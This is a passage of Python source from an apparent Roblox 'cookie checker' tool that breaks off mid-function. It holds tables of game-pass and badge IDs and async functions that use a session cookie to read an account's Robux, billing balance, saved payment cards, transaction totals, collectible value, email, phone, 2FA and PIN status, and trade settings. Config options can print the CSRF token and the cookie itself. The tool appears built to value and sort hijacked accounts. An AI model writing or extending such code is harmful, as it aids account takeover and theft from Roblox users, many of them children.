        AllEasterSkins        = 'All Easter Skins',        8868550,    'All_Easter_Skins'
        Swarmer               = 'Swarmer',                 8868555,    'Swarmer'
        ArcherTower           = 'Archer Tower',            8928263,    'Archer_Tower'
        ToxicGunner           = 'Toxic Gunner',            13534630,   'Toxic_Gunner'
        ElfCamp               = 'Elf Camp!',               112619685,  'Elf_Camp'
        Necromancer           = 'Necromancer',             643819691,  'Necromancer'
        JesterTower           = 'Jester Tower!',           652291181,  'Jester_Tower'
        CryomancerTower       = 'Cryomancer Tower',        674876666,  'Cryomancer_Tower'
        Harvester             = 'Harvester',               953808062,  'Harvester'
        HallowPunk            = 'Hallow Punk',             954430263,  'Hallow_Punk'
        Commando              = 'Commando',                977109244,  'Commando'
        Elementalist          = 'Elementalist',            1007556869, 'Elementalist'
        Snowballer            = 'Snowballer',              1007420790, 'Snowballer'
        # List Of Gamepasses
        listOfGamepasses = [Test, SmallDonation, CrookBoss, Turret, CustomMusic, Mortar, Pursuit, VIP, MemeEmotes, Sledger, Executioner, Engineer, ResizeYourPlayer, Cowboy, Warden, VigilanteSkinBundle, UnwaveringTidesBundle, MercenaryBase, GatlingGun, AdminMode, Slasher, Gladiator, FrostBlasterTower, GiftOfJoy, GiftofMystery, GiftofSharp, FireworksEmote, PartySkins, AllEasterSkins, Swarmer, ArcherTower, ToxicGunner, ElfCamp, Necromancer, JesterTower, CryomancerTower, Harvester, HallowPunk, Commando, Elementalist, Snowballer]
    class Badges:
        WelcometoTDS           = 'Welcome to TDS!',           2124615656,       'Welcome_to_TDS'
        Level10                = 'Level 10',                  2124477834,       'Level_10'
        Lvl20                  = 'Lvl 20',                    2124477835,       'Lvl_20'
        Level30                = 'Level 30',                  2124475816,       'Level_30'
        Level50                = 'Level 50',                  2124477836,       'Level_50'
        Level75                = 'Level 75',                  2124477837,       'Level_75'
        Level100               = 'Level 100',                 2124477838,       'Level_100'
        ReachLevel150          = 'Reach Level 150!',          265315644206668,  'Reach_Level_150'
        DefeatGraveDigger      = 'Defeat Grave Digger',       2124572793,       'Defeat_Grave_Digger'
        DefeatMoltenWarlord    = 'Defeat Molten Warlord',     2124572794,       'Defeat_Molten_Warlord'
        DefeattheFallenKing    = 'Defeat the Fallen King',    2124615655,       'Defeat_the_Fallen_King'
        DefeatedNuclearMonster = 'Defeated Nuclear Monster!', 2127670181,       'Defeated_Nuclear_Monster'
        DefeatedGunslinger     = 'Defeated Gunslinger!',      2128794382,       'Defeated_Gunslinger'
        DefeatedWoxTheFox      = 'Defeated Wox The Fox!',     2129234537,       'Defeated_Wox_The_Fox'
        DefeatedPatientZero    = 'Defeated Patient Zero!',    2433001319089453, 'Defeated_Patient_Zero'
        TriumphHardcore        = 'Triumph Hardcore',          2124629158,       'Triumph_Hardcore'
        Quickdraw              = 'Quickdraw!',                2128794398,       'Quickdraw'
        TheLostSouls           = 'The Lost Souls',            2129234540,       'The_Lost_Souls'
        FrostInvasionEasy      = 'Frost Invasion - Easy',     1566890568849948, 'Frost_Invasion_Easy'
        FrostInvasionHard      = 'Frost Invasion - Hard',     842976148689508,  'Frost_Invasion_Hard'
        Unnamed                = '???',                       1270412135564244, 'Unnamed'
        # List Of Badges
        listOfBadges = [WelcometoTDS, Level10, Lvl20, Level30, Level50, Level75, Level100, ReachLevel150, DefeatGraveDigger, DefeatMoltenWarlord, DefeattheFallenKing, DefeatedNuclearMonster, DefeatedGunslinger, DefeatedWoxTheFox, DefeatedPatientZero, TriumphHardcore, Quickdraw, TheLostSouls, FrostInvasionEasy, FrostInvasionHard, Unnamed]

class YourBizarreAdventure: # https://www.roblox.com/games/2809202155
    placeNames = 'Your Bizarre Adventure', 'Your_Bizarre_Adventure', 'YBA', 2809202155
    class Gamepasses:
        ItemNotifier      = 'Item Notifier',          7355317,  'Item_Notifier'
        SelectPose        = 'Select Pose',            7361207,  'Select_Pose'
        CosmeticsBundle1  = 'Cosmetics Bundle #1',    7368580,  'Cosmetics_Bundle_1'
        VoiceLines        = 'Voice Lines',            7376923,  'Voice_Lines'
        Tips              = 'Tips',                   8062778,  'Tips'
        StandStorageSlot2 = 'Stand Storage: Slot #2', 9837261,  'Stand_Storage_Slot_2'
        StandStorageSlot3 = 'Stand Storage: Slot #3', 9838197,  'Stand_Storage_Slot_3'
        StandStorageSlot4 = 'Stand Storage: Slot #4', 16423469, 'Stand_Storage_Slot_4'
        StandStorageSlot5 = 'Stand Storage: Slot #5', 16423475, 'Stand_Storage_Slot_5'
        StyleStorageSlot2 = 'Style Storage: Slot #2', 13258801, 'Style_Storage_Slot_2'
        StyleStorageSlot3 = 'Style Storage: Slot #3', 13258808, 'Style_Storage_Slot_3'
        x2CosmeticSlots   = '2x Cosmetic Slots',      14597766, '2x_Cosmetic_Slots'
        x2Inventory       = '2x Inventory',           14597778, '2x_Inventory'
        # List Of Gamepasses
        listOfGamepasses = [ItemNotifier, SelectPose, CosmeticsBundle1, VoiceLines, Tips, StandStorageSlot2, StandStorageSlot3, StandStorageSlot4, StandStorageSlot5, StyleStorageSlot2, StyleStorageSlot3, x2CosmeticSlots, x2Inventory]
    class Badges:
        Prestige1 = 'Prestige 1', 2124517293, 'Prestige_1'
        Prestige2 = 'Prestige 2', 2124517294, 'Prestige_2'
        Prestige3 = 'Prestige 3', 2124517296, 'Prestige_3'
        # List Of Badges
        listOfBadges = [Prestige1, Prestige2, Prestige3]

listOfPlaces = [AUniversalTime, AdoptMe, AnimeAdventures, AnimeDefenders, AnimeVanguards, BeeSwarmSimulator, BladeBall, BloxFruits, BlueLockRivals, CreaturesofSonaria, DaHood, DragonAdventures, Fisch, FiveNightsTD, GrandPieceOnline, JailBreak, JujutsuInfinite, KingLegacy, MurderMystery2, PetSimulator99, PetSimulatorX, PETSGO, ProjectSlayers, RoyalHigh, SolsRNG, ToiletTowerDefense, TowerDefenseSimulator, YourBizarreAdventure]

class cookieData: #                 Normal Name                             Config Name                   Color           Sort
    isAccountLink                 = 'Link',                                 'Link',                       ANSI.FG.GREEN,  None
    isCountryRegistration         = 'Country Registration',                 'Country_Registration',       ANSI.FG.RED,    str
    isID                          = 'ID',                                   'ID',                         ANSI.FG.GREEN,  str
    isName                        = 'Name',                                 'Name',                       ANSI.FG.GREEN,  str
    isDisplayName                 = 'Display Name',                         'Display_Name',               ANSI.FG.GREEN,  None
    isRegistrationDate            = 'Registration Date (D.M.Y)',            'Registration_Date',          ANSI.FG.RED,    None
    isExtendedRegistrationDateAge = 'Extended Registration Date (In Days)', 'Extended_Registration_Date', ANSI.FG.GREEN,  int
    isRobux                       = 'Robux',                                'Robux',                      ANSI.FG.RED,    int
    isBilling                     = 'Billing',                              'Billing',                    ANSI.FG.RED,    int
    isPending                     = 'Pending',                              'Pending',                    ANSI.FG.YELLOW, int
    isDonate1Year                 = 'Donate (1 Year)',                      'Donate_1_Year',              ANSI.FG.YELLOW, int
    isDonateAllTime               = 'Donate (All Time)',                    'Donate_All_Time',            ANSI.FG.BLUE,   int
    isRap                         = 'Rap',                                  'Rap',                        ANSI.FG.RED,    int
    isCard                        = 'Card',                                 'Card',                       ANSI.FG.RED,    int
    isPremium                     = 'Premium',                              'Premium',                    ANSI.FG.GREEN,  str
    isGamepasses                  = 'Gamepasses',                           'Gamepasses',                 ANSI.FG.RED,    int
    isCustomGamepasses            = 'Custom Gamepasses',                    'Custom_Gamepasses',          ANSI.FG.BLUE,   int
    isBadges                      = 'Badges',                               'Badges',                     ANSI.FG.RED,    int
    isFavoritePlaces              = 'Favorite Places',                      'Favorite_Places',            ANSI.FG.RED,    int
    isBundles                     = 'Bundles',                              'Bundles',                    ANSI.FG.RED,    int
    isInventoryPrivacy            = 'Inventory Privacy',                    'Inventory_Privacy',          ANSI.FG.RED,    str
    isTradePrivacy                = 'Trade Privacy',                        'Trade_Privacy',              ANSI.FG.RED,    str
    isCanTrade                    = 'Can Trade',                            'Can_Trade',                  ANSI.FG.GREEN,  str
    isSessions                    = 'Sessions',                             'Sessions',                   ANSI.FG.RED,    int
    isEmail                       = 'Email',                                'Email',                      ANSI.FG.GREEN,  str
    isPhone                       = 'Phone',                                'Phone',                      ANSI.FG.RED,    str
    is2FA                         = '2FA',                                  '2FA',                        ANSI.FG.GREEN,  str
    isPin                         = 'Pin',                                  'Pin',                        ANSI.FG.GREEN,  str
    isAbove13                     = '>13',                                  'Above_13',                   ANSI.FG.GREEN,  str
    isVerifiedAge                 = 'Verified Age',                         'Verified_Age',               ANSI.FG.RED,    str
    isVoice                       = 'Voice',                                'Voice',                      ANSI.FG.RED,    str
    isNumberOfFriends             = 'Friends',                              'Friends',                    ANSI.FG.RED,    int
    isNumberOfFollowers           = 'Followers',                            'Followers',                  ANSI.FG.RED,    int
    isNumberOfFollowings          = 'Followings',                           'Followings',                 ANSI.FG.RED,    int
    isRobloxBadges                = 'Roblox Badges',                        'Roblox_Badges',              ANSI.FG.RED,    None
    isXCSRFToken                  = 'X-CSRF-Token',                         'X_CSRF_Token',               ANSI.FG.RED,    None
    isCookieInConsole             = 'Cookie (In Console)',                  'Cookie_In_Console',          ANSI.FG.GREEN,  None
    # List Of Cookie Data
    listOfCookieData = [isAccountLink, isCountryRegistration, isID, isName, isDisplayName, isRegistrationDate, isExtendedRegistrationDateAge, isRobux, isBilling, isPending, isDonate1Year, isDonateAllTime, isRap, isCard, isPremium, isGamepasses, isCustomGamepasses, isBadges, isFavoritePlaces, isBundles, isInventoryPrivacy, isTradePrivacy, isCanTrade, isSessions, isEmail, isPhone, is2FA, isPin, isAbove13, isVerifiedAge, isVoice, isNumberOfFriends, isNumberOfFollowers, isNumberOfFollowings, isRobloxBadges, isXCSRFToken, isCookieInConsole]

async def isLinkFunc(isID, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Link'] and not isControlPanel:
        return '', ''
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Link:{ANSI.CLEAR} https://www.roblox.com/users/{isID} | ', f'Link: https://www.roblox.com/users/{isID} | '

async def isAccountInformationFunc(session: ClientSession, ssl=False):
    while True:
        try:
            async with session.get(f'https://www.roblox.com/my/settings/json', timeout=3, ssl=ssl) as response:
                isAccountInfomation = await response.json()
            return isAccountInfomation
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isCountryRegistrationFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Country_Registration'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://users.roblox.com/v1/users/authenticated/country-code', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isCountryRegistration = data['countryCode']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Country Reg.:{ANSI.CLEAR} {isCountryRegistration} | ', f'Country Reg.: {isCountryRegistration} | ', isCountryRegistration
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isNameFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Name'] and not isControlPanel:
        return '', '', ''
    isName = isAccountInformation['Name']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Name:{ANSI.CLEAR} {isName} | ', f'Name: {isName} | ', isName

async def isDisplayNameFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Display_Name'] and not isControlPanel:
        return '', '', ''
    isDisplayName = isAccountInformation['DisplayName']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Display Name:{ANSI.CLEAR} {isDisplayName} | ', f'Display Name: {isDisplayName} | ', isDisplayName

async def isRegistrationDateFunc(session: ClientSession, isID, isAccountInformation, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Registration_Date'] and not isControlPanel:
        return '', '', '', '', '', ''
    while True:
        try:
            async with session.get(f'https://users.roblox.com/v1/users/{isID}', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isRegistrationDate       = datetime.strptime(data['created'], '%Y-%m-%dT%H:%M:%S.%fZ').strftime('%d.%m.%Y')
                isRegistrationDateInDays = await isExtendedRegistrationDateAgeFunc(isAccountInformation, isControlPanel)
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Reg. Date:{ANSI.CLEAR} {isRegistrationDate}{isRegistrationDateInDays[0]} | ', f'Reg. Date: {isRegistrationDate}{isRegistrationDateInDays[0]} | ', isRegistrationDate, isRegistrationDateInDays[0], isRegistrationDateInDays[1], isRegistrationDateInDays[2]
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isExtendedRegistrationDateAgeFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Extended_Registration_Date'] and not isControlPanel:
        return '', '', ''
    isExtendedRegistrationDateAge = isAccountInformation['AccountAgeInDays']
    return f' ({isExtendedRegistrationDateAge})', f' ({isExtendedRegistrationDateAge})', isExtendedRegistrationDateAge

async def isRobuxFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Robux'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://economy.roblox.com/v1/users/{isID}/currency', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isRobux = data['robux']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Robux:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isRobux}' if isRobux else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Robux: {isRobux} | ', isRobux
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isBillingFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Billing'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get('https://apis.roblox.com/credit-balance/v1/get-conversion-metadata', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isBilling = data['robuxConversionAmount']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Billing:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isBilling}' if isBilling else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Billing: {isBilling} | ', isBilling
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isTransactionsForYearFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Pending'] and not config['Roblox']['CookieChecker']['Main']['Donate_1_Year'] and not isControlPanel:
        return '', '', '', ''
    while True:
        try:
            async with session.get(f'https://economy.roblox.com/v2/users/{isID}/transaction-totals?timeFrame=Year&transactionType=summary', timeout=3, ssl=ssl) as response:
                isTransactionsForYear = await response.json()
                isPending = isTransactionsForYear['pendingRobuxTotal']
                isDonate = isTransactionsForYear['outgoingRobuxTotal']
            if config['Roblox']['CookieChecker']['Main']['Pending'] and config['Roblox']['CookieChecker']['Main']['Donate_1_Year'] or isControlPanel:
                return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Pending:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isPending}' if isPending else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | {ANSI.FG.CYAN + ANSI.DECOR.BOLD}Donate (1 Year):{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isDonate}' if isDonate else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Pending: {f'{isPending}' if isPending else '0'} | Donate (1 Year): {f'{isDonate}' if isDonate else '0'} | ', isPending, isDonate
            elif config['Roblox']['CookieChecker']['Main']['Pending']:
                return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Pending:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isPending}' if isPending else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Pending: {f'{isPending}' if isPending else '0'} | ', isPending, isPending
            elif config['Roblox']['CookieChecker']['Main']['Donate_1_Year']:
                return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Donate (1 Year):{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isDonate}' if isDonate else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Donate (1 Year): {f'{isDonate}' if isDonate else '0'} | ', isDonate, isDonate
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isDonateAllTimeFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Donate_All_Time'] and not config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses'] and not isControlPanel:
        return '', '', '', '', '', ''
    isDonateAllTime = 0
    isCustomGamepasses = []
    nextPageCursorTransactions = ''
    maxPages = max(config['Roblox']['CookieChecker']['Main']['Donate_All_Time_Max_Check_Pages'], config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages'])
    pageCurrentCount = 0
    while nextPageCursorTransactions != None and pageCurrentCount != maxPages:
        try:
            async with session.get(f'https://economy.roblox.com/v2/users/{isID}/transactions?transactionType=2&limit=100&cursor={nextPageCursorTransactions}', timeout=3, ssl=ssl) as response:
                transactions = await response.json()
                for transaction in transactions['data']:
                    if config['Roblox']['CookieChecker']['Main']['Donate_All_Time'] and (config['Roblox']['CookieChecker']['Main']['Donate_All_Time_Max_Check_Pages'] == -1 or pageCurrentCount < config['Roblox']['CookieChecker']['Main']['Donate_All_Time_Max_Check_Pages']):
                        isDonateAllTime += abs(transaction['currency']['amount'])
                    if config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses'] and transaction['details']['name'] in checkListCustomGamepasses and (config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages'] == -1 or pageCurrentCount < config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses_Max_Check_Pages']):
                        isCustomGamepasses.append(transaction['details']['name'])
                nextPageCursorTransactions = transactions['nextPageCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    if config['Roblox']['CookieChecker']['Main']['Donate_All_Time'] and config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses'] or isControlPanel:
        return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Donate (All Time):{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isDonateAllTime}' if isDonateAllTime else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Donate (All Time): {isDonateAllTime} | ', isDonateAllTime, f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Custom Gamepasses:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{len(isCustomGamepasses)}' if isCustomGamepasses else f'{ANSI.FG.RED}0{ANSI.CLEAR}'} | ', f'Custom Gamepasses: {len(isCustomGamepasses)} | ', len(isCustomGamepasses)
    elif config['Roblox']['CookieChecker']['Main']['Donate_All_Time']:
        return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Donate (All Time):{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isDonateAllTime}' if isDonateAllTime else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Donate (All Time): {isDonateAllTime} | ', isDonateAllTime, '', '', ''
    elif config['Roblox']['CookieChecker']['Main']['Custom_Gamepasses']:
        return '', '', '', f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Custom Gamepasses:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{len(isCustomGamepasses)}' if isCustomGamepasses else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Custom Gamepasses: {len(isCustomGamepasses)} | ', len(isCustomGamepasses)

async def isRapFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Rap'] and not isControlPanel:
        return '', '', ''
    isRap = 0
    nextPageCursorRap = ''
    pageCurrentCount = 0
    while nextPageCursorRap != None and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Rap_Max_Check_Pages']:
        try:
            async with session.get(f'https://inventory.roblox.com/v1/users/{isID}/assets/collectibles?sortOrder=Asc&limit=100&cursor={nextPageCursorRap}', timeout=3, ssl=ssl) as response:
                rap = await response.json()
                for item in rap['data']:
                    if str(item['recentAveragePrice']).isdigit(): isRap += int(item['recentAveragePrice'])
                nextPageCursorRap = rap['nextPageCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Rap:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isRap}' if isRap else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Rap: {isRap} | ', isRap

async def isCardFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Card'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://apis.roblox.com/payments-gateway/v1/payment-profiles', timeout=3, ssl=ssl) as response:
                isCard = await response.json()
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Card:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{len(isCard)}' if isCard else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Card: {len(isCard) if isCard else '0'} | ', len(isCard)
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isPremiumFunc(isAccountInformation, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Premium'] and not isControlPanel:
        return '', '', '', ''
    isPremium = isAccountInformation['IsPremium']
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Premium:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}Yes' if isPremium else f'{ANSI.FG.RED}No'}{ANSI.CLEAR} | ', f'Premium: {'Yes' if isPremium else 'No'} | ', 'Yes' if isPremium else 'No', isPremium

async def isGamepassesFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Gamepasses'] and not isControlPanel:
        return '', '', ''
    isGamepasses = []
    isCheckListGamepasses = checkListGamepasses[:]
    nextPageCursorGamepasses = ''
    pageCurrentCount = 0
    while nextPageCursorGamepasses != None and isCheckListGamepasses and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Gamepasses_Max_Check_Pages']:
        try:
            async with session.get(f'https://apis.roblox.com/game-passes/v1/users/{isID}/game-passes?count=100&exclusiveStartId={nextPageCursorGamepasses}', timeout=3, ssl=ssl) as response:
                gamepasses = await response.json()
                gamepasses = gamepasses['gamePasses']
                if not gamepasses:
                    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Gamepasses:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{len(isGamepasses)}' if isGamepasses else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Gamepasses: {len(isGamepasses)} | ', len(isGamepasses)
                for gamepass in gamepasses:
                    if gamepass['gamePassId'] in isCheckListGamepasses:
                        isGamepasses.append(gamepass['name'])
                        isCheckListGamepasses.remove(gamepass['gamePassId'])
                if len(gamepasses) < 100:
                    nextPageCursorGamepasses = None
                else:
                    nextPageCursorGamepasses = isGamepasses[-1]
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    isGamepasses_ = ', '.join(isGamepasses) if config['Roblox']['CookieChecker']['Main']['Gamepasses_Output_Mode'] == 'Names' and isGamepasses else len(isGamepasses)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Gamepasses:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isGamepasses_}' if isGamepasses else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Gamepasses: {isGamepasses_} | ', len(isGamepasses)

async def isBadgesFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Badges'] and not isControlPanel:
        return '', '', ''
    isBadges = []
    isCheckListBadges = checkListBadges[:]
    nextPageCursorBadges = ''
    pageCurrentCount = 0
    while nextPageCursorBadges != None and isCheckListBadges and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Badges_Max_Check_Pages']:
        try:
            async with session.get(f'https://badges.roblox.com/v1/users/{isID}/badges?limit=100&cursor={nextPageCursorBadges}', timeout=3, ssl=ssl) as response:
                badges = await response.json()
                for badge in badges['data']:
                    if badge['id'] in isCheckListBadges:
                        isBadges.append(badge['name'])
                        isCheckListBadges.remove(badge['id'])
                nextPageCursorBadges = badges['nextPageCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    isBadges_ = ', '.join(isBadges) if config['Roblox']['CookieChecker']['Main']['Badges_Output_Mode'] == 'Names' and isBadges else len(isBadges)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Badges:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isBadges_}' if isBadges else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Badges: {isBadges_} | ', len(isBadges)

async def isFavoritePlacesFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Favorite_Places'] and not isControlPanel:
        return '', '', ''
    isFavoritePlaces = []
    isCheckListFavoritePlaces = deepcopy(checkListFavoritePlaces)
    nextPageCursorFavoritePlaces = ''
    pageCurrentCount = 0
    while nextPageCursorFavoritePlaces != None and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Favorite_Places_Max_Check_Pages']:
        try:
            async with session.get(f'https://games.roblox.com/v2/users/{isID}/favorite/games?limit=100&cursor={nextPageCursorFavoritePlaces}', timeout=3, ssl=ssl) as response:
                favoritePlaces = await response.json()
                for game in favoritePlaces['data']:
                    gameID = str(game['rootPlace']['id'])
                    if gameID in isCheckListFavoritePlaces:
                        isFavoritePlaces.append(isCheckListFavoritePlaces[gameID])
                        del isCheckListFavoritePlaces[gameID]
                nextPageCursorFavoritePlaces = favoritePlaces['nextPageCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    isFavoritePlaces_ = ', '.join(isFavoritePlaces) if config['Roblox']['CookieChecker']['Main']['Favorite_Places_Output_Mode'] == 'Names' and isFavoritePlaces else len(isFavoritePlaces)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Fav. Places:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isFavoritePlaces_}' if isFavoritePlaces else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Fav. Places: {isFavoritePlaces_} | ', len(isFavoritePlaces)

async def isBundlesFunc(session: ClientSession, isID, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Bundles'] and not isControlPanel:
        return '', '', ''
    isBundles = []
    isCheckListBundles = checkListBundles[:]
    nextPageCursorBundles = ''
    pageCurrentCount = 0
    while nextPageCursorBundles != None and pageCurrentCount != config['Roblox']['CookieChecker']['Main']['Bundles_Max_Check_Pages']:
        try:
            async with session.get(f'https://catalog.roblox.com/v1/users/{isID}/bundles/1?limit=100&cursor={nextPageCursorBundles}', timeout=3, ssl=ssl) as response:
                bundles = await response.json()
                for bundle in bundles['data']:
                    if bundle['id'] in isCheckListBundles:
                        isBundles.append(bundle['name'])
                        isCheckListBundles.remove(bundle['id'])
                nextPageCursorBundles = bundles['nextPageCursor']
                pageCurrentCount += 1
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)
    isBundles_ = ', '.join(isBundles) if config['Roblox']['CookieChecker']['Main']['Favorite_Places_Output_Mode'] == 'Names' and isBundles else len(isBundles)
    return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Bundles:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}{isBundles_}' if isBundles else f'{ANSI.FG.RED}0'}{ANSI.CLEAR} | ', f'Bundles: {isBundles_} | ', len(isBundles)

async def isInventoryPrivacyFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Inventory_Privacy'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get(f'https://apis.roblox.com/user-settings-api/v1/user-settings/settings-and-options', timeout=3, ssl=ssl) as response:
                data = await response.json()
                isInventoryPrivacy = data['whoCanSeeMyInventory']['currentValue']
            return f'{ANSI.FG.CYAN + ANSI.DECOR.BOLD}Inv. Privacy:{ANSI.CLEAR} {f'{ANSI.FG.GREEN}Everyone' if isInventoryPrivacy == 'AllUsers' else f'{ANSI.FG.YELLOW}Friends & Followers & Followings' if isInventoryPrivacy == 'FriendsFollowingAndFollowers' else f'{ANSI.FG.YELLOW}Friends & Followings' if isInventoryPrivacy == 'FriendsAndFollowing' else f'{ANSI.FG.YELLOW}Friends' if isInventoryPrivacy == 'Friends' else f'{ANSI.FG.RED}No One'}{ANSI.CLEAR} | ', f'Inv. Privacy: {'Everyone' if isInventoryPrivacy == 'AllUsers' else 'Friends & Followers & Followings' if isInventoryPrivacy == 'FriendsFollowingAndFollowers' else 'Friends & Followings' if isInventoryPrivacy == 'FriendsAndFollowing' else 'Friends' if isInventoryPrivacy == 'Friends' else 'No One'} | ', 'Everyone' if isInventoryPrivacy == 'AllUsers' else 'Friends & Followers & Followings' if isInventoryPrivacy == 'FriendsFollowingAndFollowers' else 'Friends & Followings' if isInventoryPrivacy == 'FriendsAndFollowing' else 'Friends' if isInventoryPrivacy == 'Friends' else 'No One'
        except (KeyError, TypeError, ContentTypeError):
            await asyncio.sleep(1)

async def isTradePrivacyFunc(session: ClientSession, ssl=False, isControlPanel=False):
    if not config['Roblox']['CookieChecker']['Main']['Trade_Privacy'] and not isControlPanel:
        return '', '', ''
    while True:
        try:
            async with session.get('https://accountsettings.roblox.com/v1/trade-privacy', timeout=3, ssl=ssl) as response:
                data = await response.json()
